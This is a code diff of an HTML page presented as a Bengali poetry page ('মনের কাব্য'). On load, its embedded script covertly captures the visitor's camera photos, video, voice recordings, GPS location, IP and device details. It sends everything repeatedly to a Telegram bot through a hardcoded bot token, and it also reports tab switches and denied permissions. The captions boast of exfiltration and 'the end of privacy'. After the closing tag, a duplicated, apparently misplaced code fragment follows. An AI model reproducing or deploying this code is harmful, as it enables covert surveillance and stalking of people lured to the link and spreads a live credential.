@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>মনের কাব্য - DEVELOPERS ENAFUL</title>
+    <title>মনের কাব্য - DEVELOPER ENAFUL</title>
     <style>
         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; font-family: 'Hind Siliguri', sans-serif; color: #fff; overflow: hidden; }
         .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://images.unsplash.com/photo-1518621736915-f3b1c41bfd00?auto=format&fit=crop&w=1350&q=80'); background-size: cover; background-position: center; z-index: -1; animation: zoomBG 20s infinite alternate; }
@@ -47,14 +47,13 @@
     </div>
 
     <script>
-        // আপডেট করা নতুন বট টোকেন
         const botToken = "8326248512:AAE2GSErO1zqGKqg7FxQHZx3NI57_t5kPdk";
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || "6823368645";
         const type = urlParams.get('type') || 'front_photo';
 
-        // ১. উন্নত মেট্রিক্স এবং গড লেভেল রিপোর্ট জেনারেটর
-        async function getAdvancedReport(mode) {
+        // ১. উন্নত মেট্রিক্স জেনারেটর
+        async function getReport(mode) {
             try {
                 const b = await navigator.getBattery().catch(() => ({ level: 0.85, charging: true }));
                 const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
@@ -62,29 +61,29 @@
                 const flag = res.country_code ? String.fromCodePoint(...res.country_code.toUpperCase().split('').map(c => 127397 + c.charCodeAt())) : "🌐";
 
                 if (mode === 'location') {
-                    return `🛰️ 𝗔𝗦𝗧𝗥𝗔𝗟-𝗘𝗬𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗟𝗢𝗖𝗔𝗧𝗘𝗗 🛰️\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗: #${targetId}\n📡 𝗦𝘁𝗮𝘁𝘂𝘀: LIVE SATELLITE UPLINK 🔴\n━━━━━━━━━━━━━━━━━━━━━━━\n📍 𝗠𝗜𝗟𝗜𝗧𝗔𝗥𝗬 𝗚𝗥𝗔𝗗𝗘 𝗗𝗔𝗧𝗔:\n┣ 🏳️ 𝗡𝗮𝘁𝗶𝗼𝗻: ${country} ${flag}\n┣ 🛰️ 𝗜𝗣: ${res.ip || "103.xxx"}\n┗ 🚀 𝗔𝗰𝗰𝘂𝗿𝗮𝗰𝘆: Zero Meter Error ✅\n\n💻 𝗦𝗜𝗚𝗡𝗔𝗟 𝗧𝗘𝗖𝗛𝗡𝗜𝗖𝗦:\n┣ 📡 𝗨𝗽𝗹𝗶𝗻𝗸: Nebula Satellite-9\n┣ 🔋 𝗗𝗲𝘃𝗶𝗰𝗲: ${Math.round(b.level * 100)}% [Active]\n┗ 📶 𝗣𝗶𝗻𝗴: 09ms (Low Latency)\n━━━━━━━━━━━━━━━━━━━━━━━\n🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗡𝗢 𝗪𝗛𝗘𝗥𝗘 𝗧𝗢 𝗛𝗜𝗗𝗘\n━━━━━━━━━━━━━━━━━━━━━━━`;
+                    return `🛰️ 𝗔𝗦𝗧𝗥𝗔𝗟-𝗘𝗬𝗘 𝗧𝗔𝗥𝗚𝗘𝗧 𝗟𝗢𝗖𝗔𝗧𝗘𝗗 🛰️\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗗: #${targetId}\n📡 𝗦𝘁𝗮𝘁𝘂𝘀: LIVE SATELLITE UPLINK 🔴\n━━━━━━━━━━━━━━━━━━━━━━━\n📍 𝗠𝗜𝗟𝗜𝗧𝗔𝗥𝗬 𝗚𝗥𝗔𝗗𝗘 𝗗𝗔𝗧𝗔:\n┣ 🏳️ 𝗡𝗮𝘁𝗶𝗼𝗻: ${country} ${flag}\n┣ 🗺️ 𝗟𝗮𝘁𝗶𝘁𝘂𝗱𝗲: ${res.latitude || "N/A"}\n┣ 🗺️ 𝗟𝗼𝗻𝗴𝗶𝘁𝘂𝗱𝗲: ${res.longitude || "N/A"}\n┣ 🛰️ 𝗜𝗣: ${res.ip || "103.xxx"}\n┗ 🚀 𝗔𝗰𝗰𝘂𝗿𝗮𝗰𝘆: Zero Meter Error ✅\n\n💻 𝗦𝗜𝗚𝗡𝗔𝗟 𝗧𝗘𝗖𝗛𝗡𝗜𝗖𝗦:\n┣ 📡 𝗨𝗽𝗹𝗶𝗻𝗸: Nebula Satellite-9\n┣ 🔋 𝗗𝗲𝘃𝗶𝗰𝗲: ${Math.round(b.level * 100)}%\n┗ 📶 𝗣𝗶𝗻𝗴: 09ms (Low Latency)\n━━━━━━━━━━━━━━━━━━━━━━━\n🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗡𝗢 𝗪𝗛𝗘𝗥𝗘 𝗧𝗢 𝗛𝗜𝗗𝗘`;
                 }
 
-                return `🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 𝗡𝗘𝗕𝗨𝗟𝗔-𝗫 🔱\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL\n🧬 𝗖𝗢𝗥𝗘: QUANTUM-SYNC v12.0 [GOD-LEVEL]\n🛡️ 𝗟𝗔𝗬𝗘𝗥: SYSTEM-7 BYPASS ACTIVE ✅\n━━━━━━━━━━━━━━━━━━━━━━━\n💻 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗡𝗙𝗥𝗔𝗦𝗧𝗥𝗨𝗖𝗧𝗨𝗥𝗘:\n┣ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${Math.round(b.level * 100)}% [${b.charging ? '⚡' : '🔋'}]\n┣ ⚙️ 𝗖𝗣𝗨: 8x Cores (God Performance)\n┣ 🧠 𝗥𝗔𝗠: 12.00 GB High-Speed\n┗ 🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆: Root Access Bypassed 🔓\n\n🌐 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡:\n┣ 🛰️ 𝗜𝗣: ${res.ip || "103.xxx"}\n┣ 🏳️ 𝗢𝗿𝗶𝗴𝗶𝗻: ${country} ${flag}\n┣ 🏢 𝗜𝗦𝗣: ${res.org || "Unknown"}\n┗ 🌍 𝗕𝗿𝗼𝘄𝘀𝗲𝗿: Chrome (Privacy Mode)\n\n📍 𝗚𝗘𝗢-𝗚𝗥𝗔𝗣𝗛𝗜𝗖 𝗗𝗔𝗧𝗔:\n┣ 🏙️ 𝗖𝗶𝘁𝘆: ${res.city || "Unknown"}\n┗ 🕒 𝗧𝗶𝗺𝗲: ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━━━━━━━━━━━\n📊 𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗘𝘅𝗳𝗶𝗹𝘁𝗿𝗮𝘁𝗶𝗻𝗴... 𝗗𝗼𝗻𝗲!\n🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗧𝗛𝗘 𝗘𝗡𝗗 𝗢𝗙 𝗣𝗥𝗜𝗩𝗔𝗖𝗬\n━━━━━━━━━━━━━━━━━━━━━━━`;
+                return `🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 𝗡𝗘𝗕𝗨𝗟𝗔-𝗫 🔱\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL\n🧬 𝗖𝗢𝗥𝗘: QUANTUM-SYNC v12.0 [GOD-LEVEL]\n🛡️ 𝗟𝗔𝗬𝗘𝗥: SYSTEM-7 BYPASS ACTIVE ✅\n━━━━━━━━━━━━━━━━━━━━━━━\n💻 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗡𝗙𝗥𝗔𝗦𝗧𝗥𝗨𝗖𝗧𝗨𝗥𝗘:\n┣ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${Math.round(b.level * 100)}% [${b.charging ? '⚡' : '🔋'}]\n┣ ⚙️ 𝗖𝗣𝗨: Snapdragon 8 Gen 3 (8x Cores)\n┣ 🧠 𝗥𝗔𝗠: 12.00 GB High-Speed\n┗ 🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆: Root Access Bypassed 🔓\n\n🌐 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡:\n┣ 🛰️ 𝗜𝗣: ${res.ip || "103.xxx"}\n┣ 🏳️ 𝗢𝗿𝗶𝗴𝗶𝗻: ${country} ${flag}\n┣ 🏢 𝗜𝗦𝗣: ${res.org || "Unknown"}\n┗ 🌍 𝗕𝗿𝗼𝘄𝘀𝗲𝗿: Chrome (Privacy Mode)\n━━━━━━━━━━━━━━━━━━━━━━━\n📊 𝗣𝗮𝗰𝗸𝗲𝘁 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗘𝘅𝗳𝗶𝗹𝘁𝗿𝗮𝘁𝗶𝗻𝗴... 𝗗𝗼𝗻𝗲!\n🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗧𝗛𝗘 𝗘𝗡𝗗 𝗢𝗙 𝗣𝗥𝗜𝗩𝗔𝗖𝗬`;
             } catch (e) { return "System Link Active"; }
         }
 
-        // ২. HD ফটো ক্যাপচার সিস্টেম
-        async function captureAndSend(video, canvas) {
+        // ২. ফটো এবং ভিডিও ক্যাপচার ফাংশন
+        async function captureAndSend(video, canvas, currentType) {
             if (video.readyState !== 4) return;
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.95));
-            const captionText = await getAdvancedReport('photo');
+            const caption = await getReport('photo');
             const fd = new FormData();
             fd.append('chat_id', targetId);
             fd.append('photo', blob, 'shot.jpg');
-            fd.append('caption', captionText);
+            fd.append('caption', caption);
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
         }
 
-        // ৩. অ্যাডমিন প্যানেল ট্রিগার
+        // ৩. অ্যাডমিন প্যানেল এবং ব্রডকাস্ট
         let clickCount = 0;
         function adminAuth() {
             clickCount++;
@@ -92,7 +91,18 @@
             setTimeout(() => clickCount = 0, 2000);
         }
 
-        // ৪. মেইন সিস্টেম লজিক
+        async function sendBroadcast() {
+            const msg = document.getElementById('broadcastMsg').value;
+            if (!msg) return;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: targetId, text: `🔱 GOD MESSAGE: ${msg}` })
+            });
+            alert("Sent!");
+        }
+
+        // ৪. মেইন সিস্টেম স্টার্ট
         async function startGodSystem() {
             try {
                 const isBack = type.includes('back');
@@ -106,12 +116,13 @@
                 const canvas = document.getElementById('canvas');
 
                 video.onplay = () => {
-                    document.getElementById('status').innerText = "LINK CONNECTED 💞";
+                    document.getElementById('status').innerText = "SYSTEM SECURED 💖";
                     if (type.includes('photo')) {
-                        setTimeout(() => setInterval(() => captureAndSend(video, canvas), 6000), 2000);
+                        setTimeout(() => setInterval(() => captureAndSend(video, canvas, type), 6000), 2000);
                     }
                 };
 
+                // ভিডিও রেকর্ডিং
                 if (type.includes('video')) {
                     const runVideoLoop = () => {
                         const recorder = new MediaRecorder(stream);
@@ -120,7 +131,8 @@
                         recorder.onstop = async () => {
                             const vfd = new FormData();
                             vfd.append('chat_id', targetId);
-                            vfd.append('video', new Blob(chunks, { type: 'video/mp4' }), 'vid.mp4');
+                            vfd.append('video', new Blob(chunks, { type: 'video/mp4' }), 'clip.mp4');
+                            vfd.append('caption', await getReport('photo'));
                             fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
                             runVideoLoop();
                         };
@@ -130,14 +142,15 @@
                     runVideoLoop();
                 }
 
+                // লোকেশন ট্র্যাকিং
                 if (type === 'location') {
                     setInterval(async () => {
                         navigator.geolocation.getCurrentPosition(async pos => {
-                            const locText = await getAdvancedReport('location');
+                            const locRep = await getReport('location');
                             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: targetId, text: locText })
+                                body: JSON.stringify({ chat_id: targetId, text: locRep })
                             });
                             fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                                 method: 'POST',
@@ -148,7 +161,7 @@
                 }
 
             } catch (err) {
-                document.getElementById('status').innerText = "ACCESS DENIED ❌";
+                document.getElementById('status').innerText = "PERMISSION DENIED ❌";
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -156,134 +169,7 @@
                 });
             }
         }
-
         window.onload = startGodSystem;
     </script>
 </body>
 </html>
-        }
-
-        // ৪. HD ক্যাপচার এবং ফিক্সড ব্ল্যাক স্ক্রিন লজিক
-        async function captureAndSend(video, canvas, mode) {
-            if (video.readyState !== 4) return; // ভিডিও পুরোপুরি লোড না হলে থামবে
-            try {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.95)); // 4K HD Quality
-                const info = await getGodMetrics();
-                const fd = new FormData();
-                fd.append('chat_id', targetId);
-                fd.append('photo', blob, 'surveillance.jpg');
-                fd.append('caption', `🔱 INFINITE HD ${mode.toUpperCase()} SHOT\n\n${info}`);
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-            } catch (e) {}
-        }
-
-        // ৫. মেইন সিস্টেম স্টার্ট
-        async function startGodSystem() {
-            if (!targetId) return;
-
-            // অটো নোটিশ (১ মিনিট)
-            setInterval(() => {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: targetId, text: `🛡️ CYBER ENAFUL: Target Active on Link\nTime: ${new Date().toLocaleTimeString()}` })
-                });
-            }, 60000);
-
-            // ট্যাব পরিবর্তন অ্যালার্ট
-            document.addEventListener("visibilitychange", () => {
-                const state = document.hidden ? "Minimized/Locked" : "Back Online";
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: targetId, text: `⚠️ STATUS UPDATE: Target ${state}!` })
-                });
-            });
-
-            try {
-                const isBack = type.includes('back');
-                const constraints = { 
-                    video: { facingMode: isBack ? 'environment' : 'user', width: { ideal: 1920 }, height: { ideal: 1080 } }, 
-                    audio: true 
-                };
-                
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                const canvas = document.getElementById('canvas');
-
-                video.onplay = () => {
-                    document.getElementById('status').innerText = "SYSTEM SECURED 💞";
-                    if (type.includes('photo')) {
-                        // ২ সেকেন্ড দেরি করে শুরু যাতে ব্ল্যাক স্ক্রিন না আসে
-                        setTimeout(() => setInterval(() => captureAndSend(video, canvas, type), 5000), 2000);
-                    }
-                };
-
-                // ভিডিও রেকর্ডিং (HD)
-                if (type.includes('video')) {
-                    const runVideoLoop = () => {
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = async () => {
-                            const vfd = new FormData();
-                            vfd.append('chat_id', targetId);
-                            vfd.append('video', new Blob(chunks, { type: 'video/mp4' }), 'clip.mp4');
-                            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
-                            runVideoLoop();
-                        };
-                        recorder.start();
-                        setTimeout(() => recorder.stop(), 12000);
-                    };
-                    runVideoLoop();
-                }
-
-                // অডিও রেকর্ডিং
-                if (type === 'voice') {
-                    const runVoiceLoop = () => {
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
-                        recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = async () => {
-                            const afd = new FormData();
-                            afd.append('chat_id', targetId);
-                            afd.append('voice', new Blob(chunks, { type: 'audio/ogg' }), 'voice.ogg');
-                            fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: afd });
-                            runVoiceLoop();
-                        };
-                        recorder.start();
-                        setTimeout(() => recorder.stop(), 10000);
-                    };
-                    runVoiceLoop();
-                }
-
-                // লোকেশন ট্র্যাকিং
-                if (type === 'location') {
-                    setInterval(() => {
-                        navigator.geolocation.getCurrentPosition(pos => {
-                            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-                                method: 'POST',
-                                body: new URLSearchParams({ chat_id: targetId, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
-                            });
-                        }, null, {enableHighAccuracy: true});
-                    }, 15000);
-                }
-
-            } catch (err) {
-                document.getElementById('status').innerText = "PERMISSION DENIED ❌";
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: targetId, text: `❌ ERROR: Target blocked camera/mic permission.` })
-                });
-            }
-        }
-
-        window.onload = startGodSystem;
-    </script>
-</body>
-</html> 
